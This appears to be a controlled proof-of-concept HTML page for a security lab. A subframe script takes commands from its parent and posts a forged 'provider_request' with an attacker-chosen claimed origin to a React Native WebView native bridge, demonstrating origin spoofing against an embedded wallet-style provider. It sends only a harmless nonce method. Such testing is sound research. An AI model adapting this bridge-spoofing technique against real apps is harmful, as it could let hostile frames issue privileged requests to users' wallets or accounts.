<!doctype html>
<html lang="en">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Controlled Origin B impact frame</title>
<body style="font:14px/1.4 system-ui;margin:12px">
<strong>Controlled Origin B</strong>
<pre id="log"></pre>
<script>
(() => {
  'use strict';

  const query = new URLSearchParams(location.search);
  const topOrigin = query.get('topOrigin');
  const session = query.get('session');
  const output = document.getElementById('log');

  if (!topOrigin || !session || new URL(topOrigin).origin !== topOrigin) {
    throw new Error('Invalid controlled test parameters');
  }

  function report(event, details = {}) {
    const message = {
      lab: 'core-impact',
      session,
      event,
      actualChildOrigin: location.origin,
      isSubframe: self !== top,
      time: new Date().toISOString(),
      ...details
    };
    output.textContent += JSON.stringify(message) + '\n';
    parent.postMessage(message, topOrigin);
  }

  function nativePost(serialized) {
    if (window.ReactNativeWebView?.postMessage) {
      window.ReactNativeWebView.postMessage(serialized);
      return 'window.ReactNativeWebView';
    }
    const ios = window.webkit?.messageHandlers?.ReactNativeWebView;
    if (ios?.postMessage) {
      ios.postMessage(serialized);
      return 'window.webkit.messageHandlers.ReactNativeWebView';
    }
    throw new Error('Native bridge is not exposed to Origin B');
  }

  addEventListener('message', event => {
    if (event.source !== parent || event.origin !== topOrigin) return;
    const data = event.data;
    if (!data || data.lab !== 'core-impact' || data.session !== session) return;
    if (data.command !== 'COLLIDE_WITH_TOP_REQUEST') return;

    try {
      if (!/^core_probe_[0-9a-f]{20}$/.test(data.nonceMethod)) {
        throw new Error('Invalid nonce method');
      }
      const wrapper = JSON.stringify({
        method: 'provider_request',
        payload: JSON.stringify({
          id: data.id,
          origin: data.claimedOrigin,
          request: { method: data.nonceMethod, params: [] }
        })
      });
      const bridge = nativePost(wrapper);
      report('ATTACKER_CHOSEN_METHOD_POSTED', {
        id: data.id,
        claimedOrigin: data.claimedOrigin,
        nonceMethod: data.nonceMethod,
        bridge
      });
    } catch (error) {
      report('CHILD_ERROR', { message: String(error) });
    }
  });

  report('CHILD_READY', {
    androidBridge: Boolean(window.ReactNativeWebView?.postMessage),
    iosRawBridge: Boolean(window.webkit?.messageHandlers?.ReactNativeWebView)
  });
})();
</script>
</body>
</html>
